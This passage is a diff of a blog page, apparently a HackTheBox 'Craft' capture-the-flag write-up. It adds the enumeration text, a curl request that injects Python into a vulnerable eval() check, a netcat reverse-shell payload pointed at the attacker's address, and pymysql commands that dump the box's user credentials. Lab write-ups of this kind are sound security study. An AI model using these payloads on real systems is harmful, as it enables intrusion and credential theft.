@@ -15,8 +15,8 @@
 
   
   
-    <title>Craft - HackTheBox &middot; Emil Pawlak</title>
-    <meta name="title" content="Craft - HackTheBox &middot; Emil Pawlak">
+    <title>Craft &middot; Emil Pawlak</title>
+    <meta name="title" content="Craft &middot; Emil Pawlak">
   
 
   
@@ -24,7 +24,7 @@
     <meta name="description" content="Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.">
   
   
-    <meta name="keywords" content="CPTS,">
+    <meta name="keywords" content="nmap,ffuf,curl,python,nc,vault,ssh,api,">
   
   
   
@@ -76,20 +76,25 @@
   
   <meta property="og:url" content="http://localhost:1313/posts/htb/craft/">
   <meta property="og:site_name" content="Emil Pawlak">
-  <meta property="og:title" content="Craft - HackTheBox">
+  <meta property="og:title" content="Craft">
   <meta property="og:description" content="Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-03-30T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-03-30T00:00:00+00:00">
-    <meta property="article:tag" content="CPTS">
+    <meta property="article:published_time" content="2026-04-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-04T00:00:00+00:00">
+    <meta property="article:tag" content="Nmap">
+    <meta property="article:tag" content="Ffuf">
+    <meta property="article:tag" content="Curl">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="Nc">
+    <meta property="article:tag" content="Vault">
     <meta property="og:image" content="http://localhost:1313/posts/htb/craft/featured.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/posts/htb/craft/featured.png">
-  <meta name="twitter:title" content="Craft - HackTheBox">
+  <meta name="twitter:title" content="Craft">
   <meta name="twitter:description" content="Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.">
 
   
@@ -131,8 +136,8 @@
   <link
     type="text/css"
     rel="stylesheet"
-    href="/css/main.bundle.min.292bc7ff19dc81e5e5b070f8bf834a3c1887b3ff660f3e8cc39d29e44477da8c9f327587f879b36b8feeda53d43c7925ac796b61ff25a8d87f901ced2cc93582.css"
-    integrity="sha512-KSvH/xncgeXlsHD4v4NKPBiHs/9mDz6Mw50p5ER32oyfMnWH&#43;Hmza4/u2lPUPHklrHlrYf8lqNh/kBztLMk1gg==">
+    href="/css/main.bundle.min.766baf69d1edc0a70d7ab868f8d3bab1393925cbad8531e06edb9b4c26e0fdc408290d7a4c0b7b5585b25db7598466a4d03645e01410addb2f746aeba5270942.css"
+    integrity="sha512-dmuvadHtwKcNerho&#43;NO6sTk5JcuthTHgbtubTCbg/cQIKQ16TAt7VYWyXbdZhGak0DZF4BQQrdsvdGrrpScJQg==">
 
   
   
@@ -240,8 +245,8 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Craft - HackTheBox",
-    "headline": "Craft - HackTheBox",
+    "name": "Craft",
+    "headline": "Craft",
     
     "inLanguage": "en",
     "url" : "http://localhost:1313/posts/htb/craft/",
@@ -250,15 +255,15 @@
       "name": "Emil Pawlak"
     },
     "copyrightYear": "2026",
-    "dateCreated": "2026-03-30T00:00:00\u002b00:00",
-    "datePublished": "2026-03-30T00:00:00\u002b00:00",
+    "dateCreated": "2026-04-04T00:00:00\u002b00:00",
+    "datePublished": "2026-04-04T00:00:00\u002b00:00",
     
-    "dateModified": "2026-03-30T00:00:00\u002b00:00",
+    "dateModified": "2026-04-04T00:00:00\u002b00:00",
     
-    "keywords": ["CPTS"],
+    "keywords": ["nmap","ffuf","curl","python","nc","vault","ssh","api"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1"
+    "wordCount": "2400"
   }]
   </script>
 
@@ -341,7 +346,7 @@
       
       class="flex items-center bf-icon-color-hover"
       aria-label="About"
-      title="About me">
+      title="Through cybersecurity, one oops at a time">
       
       
         <span class="text-base font-medium break-normal">
@@ -438,7 +443,7 @@
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
         
-        <span title="About me" class="text-2xl font-bold tracking-tight">
+        <span title="Through cybersecurity, one oops at a time" class="text-2xl font-bold tracking-tight">
           About
         </span>
         
@@ -579,7 +584,7 @@
       integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
       data-blur-id="background-blur"
       data-image-id="background-image"
-      data-image-url="/posts/htb/craft/featured_hu_1cdc1d26d1080644.png"></script>
+      data-image-url="/posts/htb/craft/featured_hu_5f9f2affd2742d19.png"></script>
   
       
     
@@ -588,7 +593,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Craft - HackTheBox
+        Craft
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -640,7 +645,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2026-03-30T00:00:00&#43;00:00">30.03.2026</time><span class="px-2 text-primary-500">&middot;</span><span>1 word</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2026-04-04T00:00:00&#43;00:00">04.04.2026</time><span class="px-2 text-primary-500">&middot;</span><span>2400 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
     
 
     
@@ -671,6 +676,26 @@
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     HackTheBox
+  </span>
+</span>
+
+        </a>
+      
+        <a class="relative mt-[0.5rem] me-2" href="/categories/cpts/">
+          <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CPTS
+  </span>
+</span>
+
+        </a>
+      
+        <a class="relative mt-[0.5rem] me-2" href="/categories/linux/">
+          <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
   </span>
 </span>
 
@@ -866,11 +891,8 @@
     class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li><a href="#summery">Summery</a></li>
-      </ul>
-    </li>
+    <li><a href="#summery">Summery</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
   </ul>
 </nav>
   </div>
@@ -884,11 +906,8 @@
     class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li><a href="#summery">Summery</a></li>
-      </ul>
-    </li>
+    <li><a href="#summery">Summery</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
   </ul>
 </nav>
   </div>
@@ -906,10 +925,429 @@
 
         <div class="article-content mb-20">
           
-<h3 class="relative group">Summery
+<h2 class="relative group">Summery
     <div id="summery" class="anchor"></div>
     
-</h3>
+</h2>
+
+<h2 class="relative group">Enumeration
+    <div id="enumeration" class="anchor"></div>
+    
+</h2>
+<p>I started my nmap scan with <code>sudo nmap -sC -sV -O -Pn 10.129.21.109; sleep 5; sudo nmap -p- -Pn 10.129.21.109; sleep 5; sudo nmap -sU -Pn 10.129.21.109</code></p>
+<p>
+
+
+
+
+<div
+  id="accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5"
+  class="border border-neutral-200 dark:border-neutral-700 rounded-lg overflow-hidden"
+  data-accordion="collapse"
+  data-accordion-separated="false"
+>
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+<details
+  class="group border-none"
+  data-accordion-item
+  
+>
+  <summary class="flex w-full cursor-pointer items-center justify-between gap-4 px-4 py-3 text-left text-lg font-semibold text-neutral-900 dark:text-neutral-100">
+    <span class="flex items-center gap-2">
+      
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+      
+      <span>nmap scan results</span>
+    </span>
+    <span class="accordion-chevron ms-auto flex h-5 w-5 items-center justify-center print:hidden">
+      <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+    </span>
+  </summary>
+<div class="px-4 pb-4 text-neutral-700 dark:text-neutral-300">
+    <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:39 CEST
+Nmap scan report for 10.129.21.109
+Host is up (0.028s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=4/2%OT=22%CT=1%CU=31105%PV=Y%DS=2%DC=I%G=Y%TM=69CE8DD5
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%C
+OS:I=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GC
+OS:D=2%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E2ST11NW7%O2=M4E2ST11NW7%O3=M4E
+OS:2NNT11NW7%O4=M4E2ST11NW7%O5=M4E2ST11NW7%O6=M4E2ST11)WIN(W1=FE88%W2=FE88%
+OS:W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M4E2NNSNW7%CC
+OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
+OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:40 CEST
+Nmap scan report for 10.129.21.109
+Host is up (0.029s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+443/tcp  open  https
+6022/tcp open  x11
+
+Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:40 CEST
+Nmap scan report for 10.129.21.109
+Host is up (0.029s latency).
+Not shown: 999 closed udp ports (port-unreach)
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+Nmap done: 1 IP address (1 host up) scanned in 1008.69 seconds
+</code></pre>
+
+  </div>
+</details>
+
+</div>
+
+<style>
+  #accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5 > details + details {
+    border-top: 1px solid rgb(var(--color-neutral-200));
+  }
+  .dark #accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5 > details + details {
+    border-top-color: rgb(var(--color-neutral-700));
+  }
+</style>
+
+<style>
+  #accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5 details[data-accordion-item] > summary .accordion-chevron {
+    transform: rotate(-90deg);
+    transition: transform 200ms ease-in-out;
+  }
+  #accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5 details[data-accordion-item][open] > summary .accordion-chevron {
+    transform: rotate(0deg);
+  }
+</style>
+
+<script>
+  (() => {
+    const root = document.getElementById("accordion-644ed5c6c1ae23ee56d2c850c8c4ffb5");
+    if (!root) return;
+    const items = root.querySelectorAll("details[data-accordion-item]");
+    items.forEach((item) => {
+      item.addEventListener("toggle", () => {
+        if (!item.open) return;
+        items.forEach((other) => {
+          if (other !== item) other.removeAttribute("open");
+        });
+      });
+    });
+  })();
+</script>
+
+
+<br>
+I accessed the port 6022 and found this info in a simple clear text</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">SSH-2.0-Go
+</span></span><span class="line"><span class="cl">��ü)¹)“3bU=²¤���Œcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1���ssh-rsa���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���none���none�������������bq¯</span></span></code></pre></div></div>
+<p><a href="https://www.speedguide.net/port.php?port=6022"  target="_blank" rel="noreferrer">Speed guide</a> shows that port 6022 belong to the x11 service which is an X Window System.
+<em>&ldquo;The X Window System is a windowing system for bitmap displays, common on Unix-like operating systems.&rdquo; ~ Wikipedia</em>
+<a href="https://www.maketecheasier.com/the-x-window-system/"  target="_blank" rel="noreferrer">Here</a> is a good read on the basic concept of x11.</p>
+<p>The website on 443 at first didn&rsquo;t work for me but now I can view it.
+Front page suggest that we will work with some API calls. both menu options use two new subdomains &ldquo;api.craft.htb&rdquo; and &ldquo;gogs.craft.htb&rdquo;. I will add them to my <code>/etc/hosts</code> and run <code>ffuf</code> to look for any other subdomains and to enumerate directories.
+<code>ffuf -u https://craft.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 291</code>
+<code>ffuf -u https://craft.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.craft.htb&quot; -fs 3779</code></p>
+<p>I also didn&rsquo;t find any comments on the main website, it does use nginx 1.15.8.
+api subdomain hosts different api calls. Two interesting one are authentication check to check validity of an authorization token and the authentication login to create the said token.
+gogs is a local git repo tools. I found some users related to it</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-Users" data-lang="Users">administrator
+ebachman Erlich Bachman
+dinesh Dinesh Chugtai
+gilfoyle Bertram Gilfoyle</code></pre></div>
+<p>I suspect there will be some API keys, tokens or creds in the repository by accident. I found a discussion about adding bogus ABV values; it was partially patched but still seems insecure, making it a potential attack vector for exploring API behavior.</p>
+<p>I this issue we can see this command holding a JWT token (JSON Web Token).
+<code>curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H &quot;Content-Type: application/json&quot; -k -X POST https://api.craft.htb/api/brew/ --data '{&quot;name&quot;:&quot;bullshit&quot;,&quot;brewer&quot;:&quot;bullshit&quot;, &quot;style&quot;: &quot;bullshit&quot;, &quot;abv&quot;: &quot;15.0&quot;)}'</code></p>
+<p>These tokens have three parts:</p>
+<ol>
+<li><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code> - Header</li>
+<li><code>eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0</code> - Payload</li>
+<li><code>wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw</code> - Signature</li>
+</ol>
+<p>Depending on the cryptographic in place I could crack it, but I&rsquo;d need to look into that more. Let&rsquo;s check other information that we can find.</p>
+<p>Later on that issue one of the users shows a commit with this patch which another developer find bad</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">+        # make sure the ABV value is sane.
+</span></span><span class="line"><span class="cl">+        if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]):
+</span></span><span class="line"><span class="cl">+            return &#34;ABV must be a decimal value less than 1.0&#34;, 400
+</span></span><span class="line"><span class="cl">+        else:
+</span></span><span class="line"><span class="cl">+            create_brew(request.json)
+</span></span><span class="line"><span class="cl">+            return None, 201</span></span></code></pre></div></div>
+<p>This is Python script, it checks if the user provided &ldquo;abv&rdquo; input is higher than 1, and depending on result of this check creates given outcomes.
+There are two interesting parts of the script for us. It uses <code>eval()</code> which is a known dangerous function in a number of different programming languages. It&rsquo;s dangerous because it runs string data as an executable instruction.
+The second interesting part is that <code>request.json['abv'])</code> plainly outputs unfiltered user output into the command.
+Both of these weakness are bad on their own as one gives a possibility of command execution and another of command injection. Together they are a really great foothold opportunity.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">parrot@parrot (~): curl -H &#39;X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw&#39; -H &#34;Content-Type: application/json&#34; -k -X POST https://api.craft.htb/api/brew/ --data &#39;{&#34;name&#34;:&#34;a&#34;,&#34;brewer&#34;:&#34;a&#34;,&#34;style&#34;:&#34;a&#34;,&#34;abv&#34;:&#34;__import__(\&#34;os\&#34;).system(\&#34;id\&#34;)&#34;}&#39; 
+</span></span><span class="line"><span class="cl">{&#34;message&#34;: &#34;Invalid token or no token found.&#34;}</span></span></code></pre></div></div>
+<p>To try and attempt to exploit this vulnerability I&rsquo;d have to have a valid token, meaning I&rsquo;d have to find a not expired one in the wild or generate one which requires credentials.</p>
+<p>I looked through the issues, repository and finally the commits and found some accidentally pushed credentials - dinesh:4aUh0A8PbVJxgd.</p>
+<p>I used them to create my token request at the api dashboard.
+No when I try to exploit the vulnerable code my token goes through and I can test my injection payloads.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">curl -H &#39;X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzc1MjA2MjQzfQ.1MRivtSjMK8IJKagIWHZRtp7M_632Rhp0vEk84UKYmU&#39; -H &#34;Content-Type: application/json&#34; -k -X POST https://api.craft.htb/api/brew/ --data &#39;{&#34;name&#34;:&#34;a&#34;,&#34;brewer&#34;:&#34;a&#34;,&#34;style&#34;:&#34;a&#34;,&#34;abv&#34;:&#34;__import__(&#34;os&#34;).system(&#34;id&#34;)&#34;}&#39; </span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">TOKEN=$(curl -s -k -X GET &#34;https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login&#34; -H  &#34;accept: application/json&#34; | jq -r &#39;.token&#39;)</span></span></code></pre></div></div>
+<p>This works too</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="err">TOKEN=$(curl</span> <span class="err">-s</span> <span class="err">-k</span> <span class="err">-X</span> <span class="err">GET</span> <span class="s2">&#34;https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;accept: application/json&#34;</span> <span class="err">|</span> <span class="err">jq</span> <span class="err">-r</span> <span class="err">&#39;.token&#39;);</span> <span class="err">\</span>
+</span></span><span class="line"><span class="cl"><span class="err">curl</span> <span class="err">-X</span> <span class="err">POST</span> <span class="s2">&#34;https://api.craft.htb/api/brew/&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;accept: application/json&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="err">-d</span> <span class="s2">&#34;{
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;id\&#34;: 0,
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;brewer\&#34;: \&#34;0xdf\&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;name\&#34;: \&#34;beer\&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;style\&#34;: \&#34;bad\&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">\&#34;abv\&#34;: \&#34;__import__(&#39;os&#39;).system(&#39;nc 10.10.15.189 1337 -e /bin/sh&#39;)\&#34;}&#34;</span> <span class="err">-k</span> <span class="err">-H</span> <span class="s2">&#34;X-CRAFT-API-TOKEN: $TOKEN&#34;</span></span></span></code></pre></div></div>
+<p>This finally works!</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="err">TOKEN=$(curl</span> <span class="err">-s</span> <span class="err">-k</span> <span class="err">-X</span> <span class="err">GET</span> <span class="s2">&#34;https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;accept: application/json&#34;</span> <span class="err">|</span> <span class="err">jq</span> <span class="err">-r</span> <span class="err">&#39;.token&#39;);</span> <span class="err">\</span>
+</span></span><span class="line"><span class="cl"><span class="err">curl</span> <span class="err">-X</span> <span class="err">POST</span> <span class="s2">&#34;https://api.craft.htb/api/brew/&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;accept: application/json&#34;</span> <span class="err">-H</span>  <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="err">-d</span> <span class="err">&#39;</span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;brewer&#34;</span><span class="p">:</span><span class="s2">&#34;0xdf&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;beer&#34;</span><span class="p">,</span><span class="nt">&#34;style&#34;</span><span class="p">:</span><span class="s2">&#34;bad&#34;</span><span class="p">,</span><span class="nt">&#34;abv&#34;</span><span class="p">:</span><span class="s2">&#34;__import__(\&#34;os\&#34;).system(\&#34;nc 10.10.15.189 1337 -e /bin/sh\&#34;)&#34;</span><span class="p">}</span><span class="err">&#39;</span> <span class="err">-k</span> <span class="err">-H</span> <span class="s2">&#34;X-CRAFT-API-TOKEN: $TOKEN&#34;</span></span></span></code></pre></div></div>
+<p>I had a surprising amount of problems with quotation marks and escaping them correctly. I spent a lot of time tweaking these commands and breaking down the api logic locally.</p>
+<p>For practice and better understanding of working with API, HTTP requests and Python I created a working script that exploits this vulnerability.
+The only requirements are to add <code>api.craft.htb</code> into the <code>/etc/hosts</code> and <code>python3</code> to run it - you can view it on my GitHub.</p>
+<p>With this behind us we got a limited shell of the <code>5a3d243127f5</code> host on which we are <code>root</code>. Looking the root directory we can see the <code>.dockerenv</code> folder hinting that we&rsquo;re inside of a container. Manual enumeration doesn&rsquo;t show any interesting vectors besides the webapp files. In them we find <code>dbtest.py</code> which is a file we saw on gogs, it creates a query to a db from the POST data it gets. Database details like the credentials, destination and it&rsquo;s name are said to be in some <code>settings</code> file. Moving into <code>craft_api</code> folder we can indeed find it. Inside, we can find the database details and a service token.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-Loot" data-lang="Loot">MYSQL_DATABASE_USER = &#39;craft&#39;
+MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39;
+CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39;</code></pre></div>
+<p>I first tried to use mysql locally - but it isn&rsquo;t installed - and call it remotely with <code>mysql -u craft -pqLGockJ6G2J75O -h 10.129.22.88</code> - but this doesn&rsquo;t work and hangs my shell. This is because the database isn&rsquo;t local, it&rsquo;s in fact on the <code>db</code> host which I assume is the Docker daemon.
+Due to the fact that my shell is connected to a simple web request it&rsquo;s limited by the timeout time of the web server which is approximately 60 seconds. Due to that limitation, I was thinking how to best access the database. As my shell access was somewhat flimsy I didn&rsquo;t want to bother setting up a chisel tunnel and work with transferring files - which also ruled out downloading <code>mysql</code> and similar tooling.
+What I stumbled upon was <code>pymysql</code> which is a python library for working with sql. As the whole box is somehow very Python for me from start until now, I decided to try it out.</p>
+<p>With my 60 second window of opportunity I tested my commands and came up with a working one.
+<code>python -c &quot;import pymysql; c=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=c.cursor(); cur.execute('SHOW TABLES'); print(cur.fetchall())&quot;</code>
+This command imports <code>pymysql</code>, connects to the database, creates a cursor which is a Python object that channels and sends the SQL queries to the database as well as simply show the queried data. You just need to adjust the query in the cursor and you can fetch any details from the database.
+Output from the above query showed me that there are two tables <code>brew</code> and <code>user</code>. Of course the latter is more interesting for us, so I ran another query.
+<code>python -c &quot;import pymysql; c=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=c.cursor(); cur.execute('SELECT * FROM user'); print(cur.fetchall())&quot;</code>
+Which gave as further credentials:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-Loot" data-lang="Loot">((1, &#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;), (4, &#39;ebachman&#39;, &#39;llJ77D8QFkLPQB&#39;), (5, &#39;gilfoyle&#39;, &#39;ZEU3N8WNM2rh4T&#39;))</code></pre></div>
+<p>Let&rsquo;s try to access SSH with them.
+Sadly both on the normal port 22 and on the SSH via Go port 6022 I was unable to use it. There is however a login form on gogs.
+I found two public keys for the users, likely for authentication to gogs, nothing special, especially without the private keys.
+dinesh: <code>SHA256:8Fc2kZiv0Y+kjkh8atKr6brzBiM1DoDIhG6LN1ktPfA</code>
+gilfoyle: <code>SHA256:D28DXyVaw0/mPuLBp3mDbS8z6oCRKS1hawJ5gxecFBQ</code></p>
+<p>Digging further into gilfoyle I found that he had a private repository called <code>craft-infra</code> on which we can find his public and private SSH keys, likely to the dc host.
+
+
+
+
+
+<div
+  id="accordion-fcc4c71865ba46c9b517400df551e3de"
+  class="border border-neutral-200 dark:border-neutral-700 rounded-lg overflow-hidden"
+  data-accordion="collapse"
+  data-accordion-separated="false"
+>
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+<details
+  class="group border-none"
+  data-accordion-item
+  
+>
+  <summary class="flex w-full cursor-pointer items-center justify-between gap-4 px-4 py-3 text-left text-lg font-semibold text-neutral-900 dark:text-neutral-100">
+    <span class="flex items-center gap-2">
+      
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
